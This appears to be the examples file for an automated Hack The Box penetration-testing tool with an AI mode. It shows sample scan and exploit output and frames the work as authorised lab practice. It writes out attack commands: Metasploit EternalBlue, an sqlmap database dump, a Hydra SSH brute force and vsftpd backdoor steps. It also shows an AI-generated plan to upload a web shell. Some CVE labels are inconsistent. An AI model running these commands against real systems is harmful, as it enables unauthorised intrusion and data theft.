# HTB Auto Pwn Examples

This file contains example usage scenarios and expected outputs for the HTB Auto Pwn tool.

**Note:** AI mode is enabled by default. All examples use AI unless explicitly disabled with `--no-ai`.

## Example 0: First Run with Missing Tools

### Command
```bash
python3 htb_auto_pwn.py -t 10.10.10.3
```

### Expected Interaction
If you're missing tools, the script will automatically detect and offer to install them:

```
[WARNING] Missing tools detected: nikto, gobuster
[WARNING] Some functionality may be limited without these tools.

Would you like to install missing tools now? (y/n): y
[INFO] Installing missing tools...
[WARNING] Installation requires root privileges.
[INFO] Attempting to use sudo...
[INFO] Updating package list...
[INFO] Installing: nikto, gobuster
[INFO] ✓ Successfully installed missing tools!

╔══════════════════════════════════════════════╗
║   HTB Automated Flag Reveal System          ║
║   Target: 10.10.10.3                        ║
╚══════════════════════════════════════════════╝
```

### Options When Prompted
- Enter `y` or `yes` to automatically install missing tools
- Enter `n` or `no` to continue without installing (limited functionality)
- Press `Ctrl+C` to cancel and exit

## Example 1: Basic Scan (AI Mode - Default)

### Command
```bash
python3 htb_auto_pwn.py -t 10.10.10.3
```

**Note:** This automatically uses AI mode. No `--ai` flag needed!

### Expected Flow
1. Quick scan discovers open ports (21, 22, 80)
2. Detailed scan identifies services
3. Vulnerability detection finds anonymous FTP
4. Exploitation retrieves files via FTP
5. Flag extracted from downloaded files

### Sample Output
```
╔══════════════════════════════════════════════╗
║   HTB Automated Flag Reveal System          ║
║   Target: 10.10.10.3                        ║
╚══════════════════════════════════════════════╝

[PHASE 1] Network Scanning
[INFO] Starting quick port scan on 10.10.10.3
[INFO] Open ports found: [21, 22, 80]
[INFO] Running detailed scan on ports: 21,22,80

[PHASE 2] Vulnerability Detection
[INFO] Analyzing for vulnerabilities...
[INFO] Checking FTP anonymous login on port 21
[INFO] Checking SSH vulnerabilities on port 22
[INFO] Checking web vulnerabilities on port 80
[INFO] Found 3 potential vulnerabilities
  - ftp_anonymous on port 21 (Severity: high)
  - ssh on port 22 (Severity: medium)
  - web on port 80 (Severity: medium)

[PHASE 3] Exploitation
[INFO] Starting exploitation phase...
[INFO] Attempting FTP anonymous exploitation on port 21
[INFO] [FLAG FOUND] FTP: 5f4dcc3b5aa765d61d8327deb882cf99

FLAGS DISCOVERED:
  ✓ 5f4dcc3b5aa765d61d8327deb882cf99 (from FTP)
```

## Example 1.5: Standard Mode (No AI)

### Command
```bash
python3 htb_auto_pwn.py -t 10.10.10.3 --no-ai
```

**Use Case:** When you want traditional scanning without AI assistance or don't have an API key set up.

### Output
```
╔══════════════════════════════════════════════╗
║   HTB Automated Flag Reveal System          ║
║   Target: 10.10.10.3                        ║
╚══════════════════════════════════════════════╝

[WARNING] AI mode disabled by user. Running in standard mode.

[PHASE 1] Network Scanning
[INFO] Starting quick port scan on 10.10.10.3
[INFO] Open ports found: [21, 22, 80]
[INFO] Running detailed scan on ports: 21,22,80

[PHASE 2] Vulnerability Detection
[INFO] Analyzing for vulnerabilities...
[INFO] Found 3 potential vulnerabilities
  - ftp_anonymous on port 21 (Severity: high)
  - ssh on port 22 (Severity: medium)
  - web on port 80 (Severity: medium)

[PHASE 3] Exploitation
[INFO] Starting exploitation phase...
[INFO] [FLAG FOUND] FTP: 5f4dcc3b5aa765d61d8327deb882cf99
```

## Example 2: AI-Enhanced Full Scan

### Command
```bash
python3 htb_auto_pwn.py -t 10.10.10.3 -v -o results.json
```

**Note:** AI is automatically enabled. The `-v` flag shows detailed AI interactions.

### AI-Enhanced Output
```
╔══════════════════════════════════════════════╗
║   HTB Automated Flag Reveal System          ║
║   Target: 10.10.10.3                        ║
╚══════════════════════════════════════════════╝

[INFO] AI-powered analysis enabled

[PHASE 1] Network Scanning
[INFO] Starting quick port scan on 10.10.10.3
[INFO] Open ports found: [21, 22, 80]
[INFO] Running detailed scan on ports: 21,22,80
[INFO] [Progress] Detailed scan completed successfully

[PHASE 1.5] AI-Powered Analysis
[INFO] 🤖 AI analyzing scan results...
[INFO] ✓ AI analysis complete
[INFO] Strategy: targeted
[INFO] Reasoning: FTP anonymous access is most promising, followed by web enumeration

[INFO] 🎯 Performing AI-guided targeted scans...
[INFO] Priority ports: 21, 80
[INFO] Identified attack vectors:
  • Anonymous FTP access for file enumeration
  • Web server directory bruteforcing
  • Potential for credential harvesting

[INFO] Running targeted scan on port 21...
[INFO] AI Recommendation: Check for writable directories and hidden files in FTP
[INFO] Running scripts: ftp-anon,ftp-bounce
[INFO] ✓ Targeted scan completed for port 21

[INFO] Running targeted scan on port 80...
[INFO] AI Recommendation: Enumerate web directories and check for admin panels
[INFO] Running scripts: http-enum,http-headers,http-methods,http-robots.txt
[INFO] ✓ Targeted scan completed for port 80

[PHASE 2] Vulnerability Detection
[INFO] Analyzing for vulnerabilities...
[INFO] Found 3 potential vulnerabilities
  - ftp_anonymous on port 21 (Severity: high)
  - ssh on port 22 (Severity: medium)
  - web on port 80 (Severity: medium)

[INFO] AI-identified potential vulnerabilities:
  • CVE-2015-3306 (vsftpd 2.3.4 backdoor)
  • Anonymous FTP write access
  • Outdated Apache version with known exploits

[PHASE 2.5] AI Exploit Analysis
[INFO] Getting exploit suggestions for 3 vulnerabilities...

============================================================
AI PROMPT - Exploit Suggestions for ftp_anonymous
============================================================
You are an expert penetration tester. Suggest specific exploits...
[Full prompt displayed here]
============================================================

============================================================
AI RESPONSE - Exploit Suggestions
============================================================
{
  "exploits": [
    {
      "name": "vsftpd 2.3.4 Backdoor Command Execution",
      "type": "metasploit",
      "command": "use exploit/unix/ftp/vsftpd_234_backdoor",
      "cve": "CVE-2011-2523",
      "success_probability": "high",
      "description": "Backdoor in vsftpd 2.3.4 allows command execution"
    }
  ],
  "tools": ["metasploit", "nmap", "lftp"],
  ...
}
============================================================

💥 Exploit Suggestions for ftp_anonymous (Port 21):

[Exploit 1] vsftpd 2.3.4 Backdoor Command Execution
  Type: metasploit
  CVE: CVE-2011-2523
  Success Probability: HIGH
  Description: Backdoor in vsftpd 2.3.4 allows command execution
  Command: use exploit/unix/ftp/vsftpd_234_backdoor

Manual Exploitation Steps:
  1. Connect to FTP with username ending in :)
  2. Backdoor opens on port 6200
  3. Connect to port 6200 for shell access

Recommended Tools:
  • metasploit
  • nmap
  • lftp

⚠️  Cautions:
  • Backdoor may be patched in some versions
  • Test in controlled environment first

References:
  • https://www.exploit-db.com/exploits/17491
  • https://github.com/rapid7/metasploit-framework

[PHASE 3] Exploitation
[INFO] 🎯 AI-recommended exploitation order:
  1. Exploit FTP anonymous access first
  2. Upload web shell through FTP if writable
  3. Enumerate web directories for sensitive files

[INFO] Starting exploitation phase...
[INFO] [FLAG FOUND] FTP: 5f4dcc3b5aa765d61d8327deb882cf99

FLAGS DISCOVERED:
  ✓ 5f4dcc3b5aa765d61d8327deb882cf99 (from FTP)
```

### AI Benefits in This Example
- Identified vsftpd backdoor vulnerability specifically
- Prioritized FTP over other services
- Suggested multi-stage attack (FTP → web shell)
- Ran targeted scripts based on service analysis

## Example 2: Verbose Mode

### Command
```bash
python3 htb_auto_pwn.py -t 10.10.10.27 -v -o lame_results.json
```

### Description
- Scans the "Lame" HTB machine
- Verbose output shows detailed debugging
- Results saved to custom JSON file
- Targets SMB vulnerabilities (MS08-067)

### Services Tested
- FTP vsftpd 2.3.4
- SSH OpenSSH 4.7p1
- SMB Samba 3.0.20

## Example 3: Web Application Target

### Command
```bash
python3 htb_auto_pwn.py -t 10.10.10.15
```

### Expected Behavior
1. Discovers web server on port 80
2. Runs nikto vulnerability scan
3. Performs directory bruteforcing
4. Tests common paths (/admin, /flag.txt, etc.)
5. Checks for exposed .git directories
6. Tests for environment file disclosure

## Example 4: Multi-Service Target

### Command
```bash
python3 htb_auto_pwn.py -t 10.10.10.100 -o multi_results.json
```

### Services Detected
- Port 21: FTP
- Port 22: SSH
- Port 80: HTTP
- Port 139: NetBIOS
- Port 445: SMB
- Port 3306: MySQL

### Attack Chain
1. Check FTP anonymous access
2. Enumerate SMB shares
3. Test database default credentials
4. Scan web application
5. Attempt SSH brute force
6. Extract flags from all sources

## Example 5: Limited Port Scan

### Command
```bash
# Modify the script to target specific ports
python3 htb_auto_pwn.py -t 10.10.10.50
```

### Custom Port Scanning
Edit the script to scan specific ports:
```python
# In NetworkScanner.quick_scan():
cmd = ['nmap', '-T4', '-p', '80,443,8080', '--open', '-oX', '/tmp/quick_scan.xml', self.target]
```

## Common Flag Locations

### FTP Servers
- Root directory files
- /pub/ directory
- User home directories

### Web Servers
- /flag.txt
- /root.txt
- /user.txt
- /.git/HEAD
- /robots.txt
- /backup/
- /admin/flag.txt

### SMB Shares
- Shared folders
- User directories
- C$ (if accessible)
- ADMIN$ (if accessible)

### SSH Access
- /root/flag.txt
- /home/user/flag.txt
- /flag.txt
- /var/www/flag.txt

## Flag Format Examples

### MD5 Hash (32 characters)
```
5f4dcc3b5aa765d61d8327deb882cf99
a1b2c3d4e5f6789012345678901234ab
```

### SHA256 Hash (64 characters)
```
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
```

### HTB Format
```
HTB{th1s_1s_4_fl4g}
HTB{anonymous_ftp_is_bad}
```

### Generic Flag Format
```
flag{found_the_vulnerability}
flag{password123}
```

## Troubleshooting Examples

### Scan Timeout with Progress Updates
```bash
$ python3 htb_auto_pwn.py -t 10.10.11.86

[INFO] Starting quick port scan on 10.10.11.86
[INFO] Scanning top 100 ports (this may take 1-2 minutes)...
[INFO] Open ports found: [22, 80]
[INFO] Running detailed scan on ports: 22,80
[INFO] Progress: Service detection, OS fingerprinting, and vulnerability scripts
[INFO] This scan may take 5-10 minutes depending on target responsiveness...
[INFO] [Progress] Running nmap with service detection and scripts...
[ERROR] Detailed scan timed out after 15 minutes
[WARNING] Attempting to parse partial results...
[INFO] Partial scan results found, parsing available data...
```

The script will automatically:
- Show progress updates during long scans
- Attempt to parse partial results if timeout occurs
- Provide actionable suggestions for resolution

### No Flags Found
```bash
# Check the JSON output for clues
cat htb_results_*.json | jq '.vulnerabilities'

# Review the log file
cat htb_auto_*.log | grep -i "flag\|error\|vulnerable"
```

### Network Connectivity Issues
```bash
$ python3 htb_auto_pwn.py -t 10.10.10.100

[ERROR] Quick scan timed out after 5 minutes
[ERROR] Target 10.10.10.100 may be unreachable or heavily filtered
[INFO] Try: ping 10.10.10.100 to verify connectivity

# Verify connectivity first
ping 10.10.10.100

# If host appears down but you know it's up, try manual scan
nmap -Pn 10.10.10.100
```

### Permission Denied Errors
```bash
$ python3 htb_auto_pwn.py -t 10.10.10.100

[ERROR] Detailed scan failed with error code 1
[ERROR] Error details: permission denied
[INFO] Try running with sudo: sudo python3 htb_auto_pwn.py -t 10.10.10.100

# Run with elevated privileges
sudo python3 htb_auto_pwn.py -t 10.10.10.100
```

## Integration with Other Tools

### Manual Metasploit Follow-up
```bash
# After identifying SMB vulnerability
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST tun0
exploit
```

### Manual sqlmap Test
```bash
# After finding web application
sqlmap -u "http://10.10.10.100/login.php" --forms --dump
```

### Manual Hydra Brute Force
```bash
# After identifying SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.100
```

## Best Practices

1. **Always get authorization** before scanning
2. **Start with quick scan** to avoid detection
3. **Review logs** even if flags are found automatically
4. **Use verbose mode** for learning and debugging
5. **Save results** for documentation and reporting
6. **Follow up manually** on interesting findings
7. **Update wordlists** regularly
8. **Test in lab environment** first

## Performance Tips

1. **Target specific ports** if you know the services
2. **Reduce timeout values** for faster scans
3. **Disable unnecessary checks** by commenting out code
4. **Use parallel scanning** for multiple targets (modify script)
5. **Run on local network** for faster response times

## Legal Reminder

⚠️ Only use this tool on:
- HTB machines you have active subscription for
- Systems you own
- Systems you have written permission to test

Never use on:
- Production systems without authorization
- Any system you don't own or have permission to test
- HTB machines you haven't purchased/activated
